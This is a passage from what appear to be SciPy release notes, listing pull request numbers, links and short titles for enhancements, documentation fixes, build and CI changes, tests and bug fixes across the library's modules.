interpolate: add a note against using triangulation based...\n* `17907 <https://github.com/scipy/scipy/pull/17907>`__: DOC: stats.wilcoxon: warn about roundoff errors in x-y\n* `17908 <https://github.com/scipy/scipy/pull/17908>`__: ENH: powerlognormal distribution improvements\n* `17909 <https://github.com/scipy/scipy/pull/17909>`__: ENH: improve accuracy of betaprime ppf in scipy.stats\n* `17915 <https://github.com/scipy/scipy/pull/17915>`__: DOC: Add warning to butter function docstring\n* `17921 <https://github.com/scipy/scipy/pull/17921>`__: CI: clean conda index upon cache invalidation\n* `17922 <https://github.com/scipy/scipy/pull/17922>`__: DOC: corrected doc of bilinear discretization of lti\n* `17929 <https://github.com/scipy/scipy/pull/17929>`__: ENH: stats.nakagami.entropy: improve formulation\n* `17930 <https://github.com/scipy/scipy/pull/17930>`__: ENH: use asymptotic expansions for entropy of \\`genlogistic\\`...\n* `17937 <https://github.com/scipy/scipy/pull/17937>`__: DOC: Update pip + venv instructions in the contributor documentation...\n* `17939 <https://github.com/scipy/scipy/pull/17939>`__: DOC: ttest_ind_from_stats: discuss negative stdev\n* `17943 <https://github.com/scipy/scipy/pull/17943>`__: ENH: early exit random-cd optimization in 1D\n* `17944 <https://github.com/scipy/scipy/pull/17944>`__: pre-commit should fail when fixes are made by Ruff\n* `17945 <https://github.com/scipy/scipy/pull/17945>`__: DOC: remove seed in HTML only\n* `17946 <https://github.com/scipy/scipy/pull/17946>`__: ENH: Maxwell distribution \\`sf\\`/\\`isf\\` override\n* `17947 <https://github.com/scipy/scipy/pull/17947>`__: TST: Update list of modules for import cycle checks\n* `17948 <https://github.com/scipy/scipy/pull/17948>`__: STY: fix only staged files.\n* `17949 <https://github.com/scipy/scipy/pull/17949>`__: ENH: stats.dirichlet_multinomial: vectorize implementation\n* `17950 <https://github.com/scipy/scipy/pull/17950>`__: MAINT: bump OpenBLAS version, bump macOS image used in GHA\n* `17956 <https://github.com/scipy/scipy/pull/17956>`__: MAINT: optimize.dual_annealing: fix callable jac with args\n* `17959 <https://github.com/scipy/scipy/pull/17959>`__: MAINT: update supported versions of Python and NumPy to follow...\n* `17961 <https://github.com/scipy/scipy/pull/17961>`__: ENH: optimize.linprog: pass unrecognized options to HiGHS verbatim\n* `17964 <https://github.com/scipy/scipy/pull/17964>`__: DEP: integrate.quad_vec: deprecate parameter full_output\n* `17967 <https://github.com/scipy/scipy/pull/17967>`__: MAINT: Fully qualify std::move invocations to fix clang -Wunqualified-std-cast-call\n* `17971 <https://github.com/scipy/scipy/pull/17971>`__: ENH: stats: add axis tuple and nan_policy to \\`sem\\` and \\`iqr\\`\n* `17975 <https://github.com/scipy/scipy/pull/17975>`__: BUG: Update test_lobpcg.py\n* `17976 <https://github.com/scipy/scipy/pull/17976>`__: DOC/MAINT: simplify release entries\n* `17980 <https://github.com/scipy/scipy/pull/17980>`__: FIX: CI: avoid passing Cython files to ruff\n* `17982 <https://github.com/scipy/scipy/pull/17982>`__: MAINT: add release entries move to blame ignore\n* `17987 <https://github.com/scipy/scipy/pull/17987>`__: DOC: move .rst.txt to source and cleaning around generating doc\n* `17989 <https://github.com/scipy/scipy/pull/17989>`__: MAINT: sparse.linalg: remove unused __main__ code\n* `17990 <https://github.com/scipy/scipy/pull/17990>`__: BLD: make musllinux wheels for nightly\n* `17998 <https://github.com/scipy/scipy/pull/17998>`__: ENH: optimize.RootResults: make \\`RootResults\\` an \\`OptimizeResult\\`\n* `18000 <https://github.com/scipy/scipy/pull/18000>`__: DOC: stats, interpolate: Fix some minor docstring issues.\n* `18002 <https://github.com/scipy/scipy/pull/18002>`__: ENH: override halflogistic \\`sf\\` and \\`isf\\`\n* `18003 <https://github.com/scipy/scipy/pull/18003>`__: ENH: improve halfnorm CDF precision\n* `18006 <https://github.com/scipy/scipy/pull/18006>`__: BLD: use a relative path to numpy include and library directories\n* `18008 <https://github.com/scipy/scipy/pull/18008>`__: MAINT: forward port 1.10.1 relnotes\n* `18013 <https://github.com/scipy/scipy/pull/18013>`__: MAINT: stats.vonmises.fit: maintain backward compatibility\n* `18015 <https://github.com/scipy/scipy/pull/18015>`__: TST: optimize.root_scalar: refactor tests and add Chandrupatla...\n* `18016 <https://github.com/scipy/scipy/pull/18016>`__: Add axes argument to ndimage filters\n* `18018 <https://github.com/scipy/scipy/pull/18018>`__: DOC: Add an example showing how to plot Rotations to the docs\n* `18019 <https://github.com/scipy/scipy/pull/18019>`__: add tests for \\`trimmed_var\\` and \\`trimmed_std\\` in \\`stats.mstats\\`\n* `18020 <https://github.com/scipy/scipy/pull/18020>`__: TST: stats.mstats: add \\`median_cihs\\`/\\`sen_seasonal_slopes\\`...\n* `18021 <https://github.com/scipy/scipy/pull/18021>`__: DEP: linalg: deprecate tri{,u,l}\n* `18022 <https://github.com/scipy/scipy/pull/18022>`__: DOC: interpolate: link to the gist with the porting guide\n* `18023 <https://github.com/scipy/scipy/pull/18023>`__: DOC: how to document examples using RNG and also self-contained...\n* `18027 <https://github.com/scipy/scipy/pull/18027>`__: DOC: fix section title typo in interpolation tutorial\n* `18028 <https://github.com/scipy/scipy/pull/18028>`__: DOC: fix underlying of title in extrapolate\n* `18029 <https://github.com/scipy/scipy/pull/18029>`__: fix error from betabinom stats using only integers for a and...\n* `18032 <https://github.com/scipy/scipy/pull/18032>`__: BLD: add NDEBUG flag for release builds\n* `18034 <https://github.com/scipy/scipy/pull/18034>`__: BLD: avoid running \\`run_command(py3, ...)\\`, for better cross-compiling\n* `18035 <https://github.com/scipy/scipy/pull/18035>`__: ENH: stats: add ecdf function\n* `18036 <https://github.com/scipy/scipy/pull/18036>`__: BLD: build Windows wheel for py39 against numpy 1.22.3\n* `18037 <https://github.com/scipy/scipy/pull/18037>`__: DOC/MAINT: fix source button\n* `18040 <https://github.com/scipy/scipy/pull/18040>`__: DOC: Fix error in doc of _minimize_trustregion_exact\n* `18043 <https://github.com/scipy/scipy/pull/18043>`__: MAINT: update GH bug template\n* `18045 <https://github.com/scipy/scipy/pull/18045>`__: MAINT: update codeowners.\n* `18047 <https://github.com/scipy/scipy/pull/18047>`__: DOC: Update scipy.spatial.distance.pdist docstring to match its...\n* `18049 <https://github.com/scipy/scipy/pull/18049>`__: STY: Include Python.h before any other headers.\n* `18050 <https://github.com/scipy/scipy/pull/18050>`__: MAINT: integrate.qmc_quad: correct behavior of parameter \\`log\\`\n* `18052 <https://github.com/scipy/scipy/pull/18052>`__: BLD: use anaconda-client to upload wheels\n* `18053 <https://github.com/scipy/scipy/pull/18053>`__: DOC fix expectile docstring - empirical CDF\n* `18058 <https://github.com/scipy/scipy/pull/18058>`__: BLD: use meson-native dependency lookup for pybind11\n* `18059 <https://github.com/scipy/scipy/pull/18059>`__: Johnson distributions \\`sf\\` and \\`isf\\` override\n* `18060 <https://github.com/scipy/scipy/pull/18060>`__: MAINT: remove pavement\n* `18061 <https://github.com/scipy/scipy/pull/18061>`__: ENH: implement array  LinearOperator\n* `18063 <https://github.com/scipy/scipy/pull/18063>`__: DOC: improve documentation for distance_transform_{cdt,edt}\n* `18064 <https://github.com/scipy/scipy/pull/18064>`__: DOC: add examples in for xlogy\n* `18066 <https://github.com/scipy/scipy/pull/18066>`__: TST: stats.nct: add test for crash with large nc\n* `18068 <https://github.com/scipy/scipy/pull/18068>`__: TST: stats.ksone: loosen variance test tolerance\n* `18070 <https://github.com/scipy/scipy/pull/18070>`__: Docstring: note on bivariate spline axis ordering\n* `18072 <https://github.com/scipy/scipy/pull/18072>`__: DOC: Modifying t parameter documentation issue in splprep #17893\n* `18073 <https://github.com/scipy/scipy/pull/18073>`__: MAINT: avoid non-recommended numpy functions and constants\n* `18075 <https://github.com/scipy/scipy/pull/18075>`__: MAINT: update pooch deps\n* `18076 <https://github.com/scipy/scipy/pull/18076>`__: DOC: fix docstring typo for \\`kurtosis\\` and whitespace in \\`_continuous_distns\\`\n* `18077 <https://github.com/scipy/scipy/pull/18077>`__: BUG: Check for initial state finiteness\n* `18081 <https://github.com/scipy/scipy/pull/18081>`__: ENH: allow single observation for equal variance in \\`stats.ttest_ind\\`\n* `18082 <https://github.com/scipy/scipy/pull/18082>`__: DOC: add examples for xlog1py\n* `18083 <https://github.com/scipy/scipy/pull/18083>`__: STY: fix mypy assignment.\n* `18084 <https://github.com/scipy/scipy/pull/18084>`__: BUG: calculate VDC permutations at init of Halton\n* `18092 <https://github.com/scipy/scipy/pull/18092>`__: ENH: stats.ecdf: support right-censored data\n* `18094 <https://github.com/scipy/scipy/pull/18094>`__: ENH: improve entropy calculation of chi distribution using asymptotic...\n* `18095 <https://github.com/scipy/scipy/pull/18095>`__: ENH: asymptotic expansion for gamma distribution entropy\n* `18096 <https://github.com/scipy/scipy/pull/18096>`__: MAINT: stats.johnsonsu: override _stats\n* `18098 <https://github.com/scipy/scipy/pull/18098>`__: ENH: increase available range of Gompertz entropy using scaled_exp1\n* `18101 <https://github.com/scipy/scipy/pull/18101>`__: DOC: adding references to the UnivariateSpline docstring #17828\n* `18102 <https://github.com/scipy/scipy/pull/18102>`__: ENH: stats.goodness_of_fit: add Filliben's test\n* `18104 <https://github.com/scipy/scipy/pull/18104>`__: BUG: enable matlab nested arrs\n* `18107 <https://github.com/scipy/scipy/pull/18107>`__: ENH: add Dunnett's test\n* `18112 <https://github.com/scipy/scipy/pull/18112>`__: FIX: reset semantic in \\`QMCEngine.reset\\`\n* `18120 <https://github.com/scipy/scipy/pull/18120>`__: Correct the comments about \\` fmin_powell\\` in \\`scipy/optimize\\`\n* `18122 <https://github.com/scipy/scipy/pull/18122>`__: ENH: Added asymptotic expansion for invgamma entropy (#18093)\n* `18127 <https://github.com/scipy/scipy/pull/18127>`__: MAINT: cleanup inconsistencies in _continous_dists\n* `18128 <https://github.com/scipy/scipy/pull/18128>`__: MAINT: add test against generic fit method for vonmises distribution\n* `18129 <https://github.com/scipy/scipy/pull/18129>`__: TST: stats.rv_continuous.fit: use \\`nnlf\\` instead of \\`_reduce_func\\`...\n* `18130 <https://github.com/scipy/scipy/pull/18130>`__: Some doc updates and small code tweaks.\n* `18131 <https://github.com/scipy/scipy/pull/18131>`__: ENH: Added asymptotic expansion for gengamma entropy\n* `18134 <https://github.com/scipy/scipy/pull/18134>`__: ENH: stats: Improve _cdf and implement _sf for genhyperbolic\n* `18135 <https://github.com/scipy/scipy/pull/18135>`__: Added asymptotic expansion for t entropy (#18093)\n* `18136 <https://github.com/scipy/scipy/pull/18136>`__: ENH: stats.ecdf: add \\`confidence_interval\\` methods\n* `18137 <https://github.com/scipy/scipy/pull/18137>`__: Bugfix for somersd where an integer overflow could occur\n* `18138 <https://github.com/scipy/scipy/pull/18138>`__: ENH: improve precision of genlogistic methods\n* `18144 <https://github.com/scipy/scipy/pull/18144>`__: DOC: Add doc examples for friedmanchisquare\n* `18145 <https://github.com/scipy/scipy/pull/18145>`__: BLD: emit a warning when building from source on 32-bit Windows\n* `18149 <https://github.com/scipy/scipy/pull/18149>`__: TST: fix issue with inaccurate \\`cython_blas\\` tests\n* `18150 <https://github.com/scipy/scipy/pull/18150>`__: ENH: add CI and str to Dunnett's test\n* `18152 <https://github.com/scipy/scipy/pull/18152>`__: ENH: stats.moment: enable non-central moment calculation\n* `18157 <https://github.com/scipy/scipy/pull/18157>`__: CI: fix pre-release job that is failing on Cython 3.0b1\n* `18158 <https://github.com/scipy/scipy/pull/18158>`__: DOC:stats: Fix levy and levy_l descriptions\n* `18160 <https://github.com/scipy/scipy/pull/18160>`__: BUG: Wrong status returned by _check_result. See #18106. optimize\n* `18162 <https://github.com/scipy/scipy/pull/18162>`__: ENH: Dweibull entropy\n* `18168 <https://github.com/scipy/scipy/pull/18168>`__: TST: spatial: skip failing test to make CI green again\n* `18172 <https://github.com/scipy/scipy/pull/18172>`__: MAINT: optimize.root_scalar: return gracefully when callable...\n* `18173 <https://github.com/scipy/scipy/pull/18173>`__: DOC: update links for ARPACK to point to ARPACK-NG\n* `18174 <https://github.com/scipy/scipy/pull/18174>`__: DOC: cite pip issue about multiple \\`--config-settings\\`\n* `18178 <https://github.com/scipy/scipy/pull/18178>`__: ENH: Added \\`_sf\\` method for anglit distribution (#17832)\n* `18181 <https://github.com/scipy/scipy/pull/18181>`__: DOC: wheel build infra updates\n* `18187 <https://github.com/scipy/scipy/pull/18187>`__: MAINT: stats.ecdf: store number at risk just before events\n* `18188 <https://github.com/scipy/scipy/pull/18188>`__: BUG: interpolate: add x-y length validation for \\`make_smoothing_spline\\`.\n* `18189 <https://github.com/scipy/scipy/pull/18189>`__: DOC: Fix for side bar rendering on top of text issue\n* `18190 <https://github.com/scipy/scipy/pull/18190>`__: ENH: fix vonmises fit for bad guess of location parameter\n* `18193 <https://github.com/scipy/scipy/pull/18193>`__: MAINT: stats.kendalltau: avoid overflow\n* `18195 <https://github.com/scipy/scipy/pull/18195>`__: MAINT: interpolate: remove duplicated FITPACK interface _fitpack._spl_.\n* `18196 <https://github.com/scipy/scipy/pull/18196>`__: ENH: add Log rank for survival analysis\n* `18199 <https://github.com/scipy/scipy/pull/18199>`__: BUG: throw ValueError for mismatched w dimensions and test for...\n* `18200 <https://github.com/scipy/scipy/pull/18200>`__: TST: stats: Move genexpon from xslow to slow fit test sets.\n* `18204 <https://github.com/scipy/scipy/pull/18204>`__: MAINT/TST: fix \\`Slerp\\` typing and better iv in \\`Rotation\\`\n* `18207 <https://github.com/scipy/scipy/pull/18207>`__: ENH: improve precision of folded normal distribution cdf\n* `18209 <https://github.com/scipy/scipy/pull/18209>`__: ENH: improve integrate.simpson for even number of points\n* `18210 <https://github.com/scipy/scipy/pull/18210>`__: ENH: stats.ttest_ind: add degrees of freedom and confidence interval\n* `18212 <https://github.com/scipy/scipy/pull/18212>`__: ENH: stats.ecdf: add \\`evaluate\\` and \\`plot\\` methods; restructure...\n* `18215 <https://github.com/scipy/scipy/pull/18215>`__: DOC: stats: describe attributes of \\`DunnettResult\\`\n* `18216 <https://github.com/scipy/scipy/pull/18216>`__: MAINT: replace use of make_dataclass with explicit dataclasses\n* `18217 <https://github.com/scipy/scipy/pull/18217>`__: MAINT: stats: consistently return NumPy numbers\n* `18221 <https://github.com/scipy/scipy/pull/18221>`__: DOC: add guidance on how to make a dataclass for result objects\n* `18222 <https://github.com/scipy/scipy/pull/18222>`__: MAINT: stats.TTestResult: fix NaN bug in ttest confidence intervals\n* `18225 <https://github.com/scipy/scipy/pull/18225>`__: ENH:MAINT:linalg det in Cython and with nDarray support\n* `18227 <https://github.com/scipy/scipy/pull/18227>`__: ENH: stats: resampling methods configuration classes and example...\n* `18228 <https://github.com/scipy/scipy/pull/18228>`__: ENH: stats.geometric.entropy: implement analytical formula\n* `18229 <https://github.com/scipy/scipy/pull/18229>`__: ENH: stats.bootstrap: add one-sided confidence intervals\n* `18230 <https://github.com/scipy/scipy/pull/18230>`__: BUG: nan segfault in KDTree, reject non-finite input\n* `18231 <https://github.com/scipy/scipy/pull/18231>`__: ENH: stats.monte_carlo_test: add support for multi-sample statistics\n* `18232 <https://github.com/scipy/scipy/pull/18232>`__: ENH: override dweibull distribution survival and inverse survival...\n* `18237 <https://github.com/scipy/scipy/pull/18237>`__: MAINT: update typing of Rotation\n* `18238 <https://github.com/scipy/scipy/pull/18238>`__: MAINT:optimize: shgo assorted fixes\n* `18240 <https://github.com/scipy/scipy/pull/18240>`__: fix typo\n* `18241 <https://github.com/scipy/scipy/pull/18241>`__: MAINT: remove Gitpod in favour of GitHub CodeSpaces\n* `18242 <https://github.com/scipy/scipy/pull/18242>`__: MAINT: Allow scipy to be compiled in cython3\n* `18243 <https://github.com/scipy/scipy/pull/18243>`__: TST: stats.dunnett: fix seed in test_shapes\n* `18245 <https://github.com/scipy/scipy/pull/18245>`__: DOC: remove content related to \\`setup.py\\` usage from the docs\n* `18246 <https://github.com/scipy/scipy/pull/18246>`__: ci: touch up wheel build action\n* `18247 <https://github.com/scipy/scipy/pull/18247>`__: BLD: Add const to Cython signatures for BLAS/LAPACK\n* `18248 <https://github.com/scipy/scipy/pull/18248>`__: BLD: implement version check for minimum Cython version\n* `18251 <https://github.com/scipy/scipy/pull/18251>`__: DOC: orthogonal_procrustes fix date of reference paper and DOI\n* `18257 <https://github.com/scipy/scipy/pull/18257>`__: BLD: fix missing build dependency on cython signature .txt files\n* `18258 <https://github.com/scipy/scipy/pull/18258>`__: DOC: fix link in release notes v1.7\n* `18261 <https://github.com/scipy/scipy/pull/18261>`__: Add axes support to uniform_filter, minimum_filter, maximum_filter\n* `18263 <https://github.com/scipy/scipy/pull/18263>`__: BUG: some tweaks to PROPACK f2py wrapper and build flags\n* `18264 <https://github.com/scipy/scipy/pull/18264>`__: MAINT: remove \\`from numpy.math cimport\\` usages, update \\`npy_blas.h\\`\n* `18266 <https://github.com/scipy/scipy/pull/18266>`__: MAINT: Explicitly mark \\`cdef\\` functions not raising exception...\n* `18269 <https://github.com/scipy/scipy/pull/18269>`__: ENH: stats: Implement _sf and _isf for exponweib.\n* `18270 <https://github.com/scipy/scipy/pull/18270>`__: CI: test meson-python from its main branch in one CI job\n* `18275 <https://github.com/scipy/scipy/pull/18275>`__: TST: stats: infrastructure for generation of distribution function...\n* `18276 <https://github.com/scipy/scipy/pull/18276>`__: MAINT: stats.betaprime: avoid spurious warnings in \\`fit\\`, \\`stats\\`\n* `18280 <https://github.com/scipy/scipy/pull/18280>`__: DOC: spatial.distance: update formula for {s,sq}euclidean\n* `18281 <https://github.com/scipy/scipy/pull/18281>`__: BLD: Enable incompatible pointer types warnings\n* `18284 <https://github.com/scipy/scipy/pull/18284>`__: DOC: improved gmres doc on preconditioning (scipy.sparse.linalg)\n* `18285 <https://github.com/scipy/scipy/pull/18285>`__: MAINT: Remove codecov\n* `18287 <https://github.com/scipy/scipy/pull/18287>`__: DOC: \\`distance_transform_bf\\` example\n* `18288 <https://github.com/scipy/scipy/pull/18288>`__: TST: stats.ortho_group: improve determinant distribution test\n* `18289 <https://github.com/scipy/scipy/pull/18289>`__: MAINT: mmread allow leading whitespace\n* `18290 <https://github.com/scipy/scipy/pull/18290>`__: DEP: stats.mode: raise with non-numeric input\n* `18291 <https://github.com/scipy/scipy/pull/18291>`__: TST: stats._axis_nan_policy: add test that decorated function...\n* `18292 <https://github.com/scipy/scipy/pull/18292>`__: CI: add CircleCI API token to fix html preview link\n* `18293 <https://github.com/scipy/scipy/pull/18293>`__: BUG: fix for incompatible pointer warning from stats._rcond #18282\n* `18294 <https://github.com/scipy/scipy/pull/18294>`__: CI: remove \\`setup.py\\` based jobs from GitHub Actions and run...\n* `18297 <https://github.com/scipy/scipy/pull/18297>`__: MAINT: linalg.solve_discrete_are: fix typo in error message\n* `18299 <https://github.com/scipy/scipy/pull/18299>`__: DOC: interpolate: add see also references for data on regular...\n* `18301 <https://github.com/scipy/scipy/pull/18301>`__: CI: remove \\`runtests.py\\` and related scripts/files\n* `18303 <https://github.com/scipy/scipy/pull/18303>`__: DOC: css adjustment in dark mode and hidden toctree in dev section\n* `18304 <https://github.com/scipy/scipy/pull/18304>`__: MAINT: update boost_math\n* `18305 <https://github.com/scipy/scipy/pull/18305>`__: ENH: ndimage: add axes argument to rank_filter, percentile_filter,...\n* `18307 <https://github.com/scipy/scipy/pull/18307>`__: DOC: add cdf under methods for multivariate t distribution\n* `18311 <https://github.com/scipy/scipy/pull/18311>`__: CI: move lint job from Azure to GHA\n* `18312 <https://github.com/scipy/scipy/pull/18312>`__: CI: move gcc-8 test to GHA\n* `18313 <https://github.com/scipy/scipy/pull/18313>`__: CI: remove asv from AzureCI\n* `18314 <https://github.com/scipy/scipy/pull/18314>`__: CI: remove scikit-umfpack/sparse from Azure testing\n* `18315 <https://github.com/scipy/scipy/pull/18315>`__: CI: remove coverage jobs\n* `18318 <https://github.com/scipy/scipy/pull/18318>`__: MAINT: Mark function pointer ctypedefs as noexcept\n* `18320 <https://github.com/scipy/scipy/pull/18320>`__: CI: migrate ref guide-check to CircleCI\n* `18321 <https://github.com/scipy/scipy/pull/18321>`__: Revert \"ENH: stats.anderson_ksamp: add permutation version of...\n* `18323 <https://github.com/scipy/scipy/pull/18323>`__: ENH: increase available range of vonmises \\`fit\\`\n* `18324 <https://github.com/scipy/scipy/pull/18324>`__: ENH: add \\`entropy\\` method for multivariate t distribution\n* `18325 <https://github.com/scipy/scipy/pull/18325>`__: CI: move Azure cp39/full/win job to GHA\n* `18327 <https://github.com/scipy/scipy/pull/18327>`__: MAINT: optimize.milp: improve behavior for unexpected sparse...\n* `18328 <https://github.com/scipy/scipy/pull/18328>`__: MAINT: stats.shapiro: override p-value when len(x)==3\n* `18330 <https://github.com/scipy/scipy/pull/18330>`__: BLD: avoid build warnings on Windows, bump pybind11 and meson...\n* `18332 <https://github.com/scipy/scipy/pull/18332>`__: TST: fix minor tolerance issue for \\`stats.multivariate_t\\` test\n* `18333 <https://github.com/scipy/scipy/pull/18333>`__: CI: windows cp311 use-pythran=false full, sdist GHA\n* `18337 <https://github.com/scipy/scipy/pull/18337>`__: MAINT: update boost_math\n* `18339 <https://github.com/scipy/scipy/pull/18339>`__: TST: optimize: fix test_milp_timeout\n* `18340 <https://github.com/scipy/scipy/pull/18340>`__: DOC: interpolate: declare Rbf legacy\n* `18341 <https://github.com/scipy/scipy/pull/18341>`__: DEP: signal: deprecate using medfilt and order_filter with float128...\n* `18342 <https://github.com/scipy/scipy/pull/18342>`__: TST: stats.mstats.median_cihs: strengthen test\n* `18343 <https://github.com/scipy/scipy/pull/18343>`__: MAINT: use math.prod (python >= 3.8)\n* `18344 <https://github.com/scipy/scipy/pull/18344>`__: MAINT: Set cython compiler directive cpow to True\n* `18345 <https://github.com/scipy/scipy/pull/18345>`__: DEV: work around pathlib bug affecting dev.py for Python 3.9...\n* `18349 <https://github.com/scipy/scipy/pull/18349>`__: MAINT: stats.dgamma.entropy: avoid deprecated NumPy usage and...\n* `18350 <https://github.com/scipy/scipy/pull/18350>`__: TST: use np not math for functions to avoid conversion of ndim>0...\n* `18351 <https://github.com/scipy/scipy/pull/18351>`__: CI: remove Azure sdist job\n* `18352 <https://github.com/scipy/scipy/pull/18352>`__: MAINT: stats: more avoidance of deprecated NumPy usage\n* `18353 <https://github.com/scipy/scipy/pull/18353>`__: Migrate ruff.toml configuration to lint.toml\n* `18355 <https://github.com/scipy/scipy/pull/18355>`__: ENH: allow dividing LinearOperator by number\n* `18357 <https://github.com/scipy/scipy/pull/18357>`__: MAINT: clearer error in \\`LinearOperator \\* spmatrix\\`\n* `18358 <https://github.com/scipy/scipy/pull/18358>`__: ENH:MAINT:linalg:lu Cythonized and ndarray support added\n* `18359 <https://github.com/scipy/scipy/pull/18359>`__: MAINT: Fix broken link in setup.py\n* `18360 <https://github.com/scipy/scipy/pull/18360>`__: DOC: improve neg. binomial function examples in \\`special\\`\n* `18362 <https://github.com/scipy/scipy/pull/18362>`__: MAINT: Add noexcept function declaration to \\`_cythonized_array_utils.pxd\\`\n* `18369 <https://github.com/scipy/scipy/pull/18369>`__: CI: bdist_wheel windows job Azure --> GHA\n* `18370 <https://github.com/scipy/scipy/pull/18370>`__: DOC: stats.chisquare: attribute is pvalue, not p\n* `18374 <https://github.com/scipy/scipy/pull/18374>`__: CI: pin to rtools40\n* `18378 <https://github.com/scipy/scipy/pull/18378>`__: DOC: add output_type to signature of cKDTree.query_pairs\n* `18379 <https://github.com/scipy/scipy/pull/18379>`__: TST/MAINT: remove vonmises fit correctnes test for extreme kappa...\n* `18380 <https://github.com/scipy/scipy/pull/18380>`__: MAINT: Limit fittable data for von mises fisher distribution...\n* `18382 <https://github.com/scipy/scipy/pull/18382>`__: TST: stats.cosine: modify test to silence failure\n* `18383 <https://github.com/scipy/scipy/pull/18383>`__: MAINT: add smoke testing of signal.detrend\n* `18384 <https://github.com/scipy/scipy/pull/18384>`__: DOC: improve vonmises documentation\n* `18387 <https://github.com/scipy/scipy/pull/18387>`__: DOC: interpolate: deduplicate docstrings in _fitpack_py and _fitpack_impl\n* `18392 <https://github.com/scipy/scipy/pull/18392>`__: BUG: optimize.differential_evolution: fix division by zero error\n* `18399 <https://github.com/scipy/scipy/pull/18399>`__: DOC: Replace \"HACKING\" with \"hacking\"\n* `18400 <https://github.com/scipy/scipy/pull/18400>`__: DOC: improve description of the method argument in mannwhitneyu\n* `18402 <https://github.com/scipy/scipy/pull/18402>`__: TST: fix failing signal.windows tests\n* `18405 <https://github.com/scipy/scipy/pull/18405>`__: Revert \"BLD: Add const to Cython signatures for BLAS/LAPACK (#18247)\"\n* `18410 <https://github.com/scipy/scipy/pull/18410>`__: TST: fix test failures in linprog unboundedness test\n* `18411 <https://github.com/scipy/scipy/pull/18411>`__: BLD: an Intel Fortran fix and MinGW-related cleanups\n* `18412 <https://github.com/scipy/scipy/pull/18412>`__: MAINT: signal: simplify shape manipulations in signal.detrend\n* `18413 <https://github.com/scipy/scipy/pull/18413>`__: MAINT: Harmonized documentation for Interpolator classes\n* `18414 <https://github.com/scipy/scipy/pull/18414>`__: CI: move last Azure job to GHA\n* `18418 <https://github.com/scipy/scipy/pull/18418>`__: Fix warning when \\`nogil\\` is placed before \\`except\\`\n* `18419 <https://github.com/scipy/scipy/pull/18419>`__: MAINT: interpolate: remove unused codes in \\`_fitpackmodule.c\\`.\n* `18421 <https://github.com/scipy/scipy/pull/18421>`__: BLD: more PROPACK fixes, removing timer code\n* `18422 <https://github.com/scipy/scipy/pull/18422>`__: MAINT: stats: genexpon is no longer too slow for test_rvs_broadcast.\n* `18426 <https://github.com/scipy/scipy/pull/18426>`__: BLD: fix two \\`-Duse-g77-abi\\` regressions and a PROPACK bug\n* `18427 <https://github.com/scipy/scipy/pull/18427>`__: ENH: prevent unnecessary computation in \\`scipy.stats.rankdata\\`\n* `18429 <https://github.com/scipy/scipy/pull/18429>`__: DOC: rewrite all build docs and restructure build/contributor...\n* `18430 <https://github.com/scipy/scipy/pull/18430>`__: MAINT: stats.mode: improve \\`nan_policy\\` behavior\n* `18433 <https://github.com/scipy/scipy/pull/18433>`__: ENH: improve t distribution logpdf and pdf for large degrees...\n* `18438 <https://github.com/scipy/scipy/pull/18438>`__: BLD: DOC: fix Sphinx doc build caching behavior for \\`.dev\\`...\n* `18439 <https://github.com/scipy/scipy/pull/18439>`__: BLD: detect \\`xsimd\\` if it's installed and add to pythran dependency\n* `18441 <https://github.com/scipy/scipy/pull/18441>`__: ENH:stats: add sf method for betaprime\n* `18442 <https://github.com/scipy/scipy/pull/18442>`__: TST: fix precision of several linalg/sparse.linalg tests\n* `18444 <https://github.com/scipy/scipy/pull/18444>`__: DOC: clarify Sobel transform\n* `18446 <https://github.com/scipy/scipy/pull/18446>`__: MAINT: fix Deb03 GO benchmark\n* `18447 <https://github.com/scipy/scipy/pull/18447>`__: DOC: remove references to Azure\n* `18449 <https://github.com/scipy/scipy/pull/18449>`__: ENH: increase truncated exponential distribution sf/isf precision\n* `18451 <https://github.com/scipy/scipy/pull/18451>`__: DEV: use number of physical cores in \\`dev.py build\\` by default\n* `18454 <https://github.com/scipy/scipy/pull/18454>`__: DOC: add \\`distance_transform_cdt\\` example\n* `18455 <https://github.com/scipy/scipy/pull/18455>`__: MAINT: simplifiy detrend\n* `18458 <https://github.com/scipy/scipy/pull/18458>`__: DOC: odr: clarify \\`cov_beta\\` is not scaled by the residual...\n* `18459 <https://github.com/scipy/scipy/pull/18459>`__: DOC: optimize: add use of functools.partial to tutorial\n* `18460 <https://github.com/scipy/scipy/pull/18460>`__: DOC: examples for \\`ndimage.generic_filter\\`\n* `18461 <https://github.com/scipy/scipy/pull/18461>`__: TST: stats: ReferenceDistribution: use complementary methods...\n* `18462 <https://github.com/scipy/scipy/pull/18462>`__: MAINT: Clean up scipy/sparse/linalg/_isolve/tests/test_iterative.py\n* `18463 <https://github.com/scipy/scipy/pull/18463>`__: MAINT: parametrize scipy/sparse/linalg/_isolve/tests/test_iterative.py\n* `18466 <https://github.com/scipy/scipy/pull/18466>`__: DOC: fix issues in \\`svds\\` docstring examples that were failing...\n* `18468 <https://github.com/scipy/scipy/pull/18468>`__: BLD: enforce utf-8 in tools/cythonize.py, and some cleanups\n* `18472 <https://github.com/scipy/scipy/pull/18472>`__: MAINT: remove lsim2/impulse2/step2 docstring examples\n* `18475 <https://github.com/scipy/scipy/pull/18475>`__: DOC: remove warnings in doc build\n* `18476 <https://github.com/scipy/scipy/pull/18476>`__: TST: stats/optimize: filter warnings in tests\n* `18482 <https://github.com/scipy/scipy/pull/18482>`__: MAINT: ensure Nelder-Mead respects floating point type\n* `18486 <https://github.com/scipy/scipy/pull/18486>`__: DOC: remove already-resolved deprecation warning filter\n* `18489 <https://github.com/scipy/scipy/pull/18489>`__: DEP: signal: deprecate importing window functions from signal...\n* `18493 <https://github.com/scipy/scipy/pull/18493>`__: BUG: stats: Fix the variable that is checked to skip a test.\n* `18500 <https://github.com/scipy/scipy/pull/18500>`__: MAINT: tweak code comment for list of private-but-present modules\n* `18501 <https://github.com/scipy/scipy/pull/18501>`__: TST: interpolate: add a regression test for bisplev integer overflow\n* `18502 <https://github.com/scipy/scipy/pull/18502>`__: BUG: guard against non-finite kd-tree queries\n* `18503 <https://github.com/scipy/scipy/pull/18503>`__: Fix PPoly readonly issue for c parameter\n* `18504 <https://github.com/scipy/scipy/pull/18504>`__: MAINT: upload nighlighties to new location\n* `18505 <https://github.com/scipy/scipy/pull/18505>`__: MAINT: sparse: Generalize isshape to (optionally) handle non-2d...\n* `18507 <https://github.com/scipy/scipy/pull/18507>`__: Clean up sparse array API\n* `18508 <https://github.com/scipy/scipy/pull/18508>`__: ENH: Ensure that the result of divide(sparse, dense) is sparse\n* `18509 <https://github.com/scipy/scipy/pull/18509>`__: Remove indices downcasting for sparse arrays\n* `18510 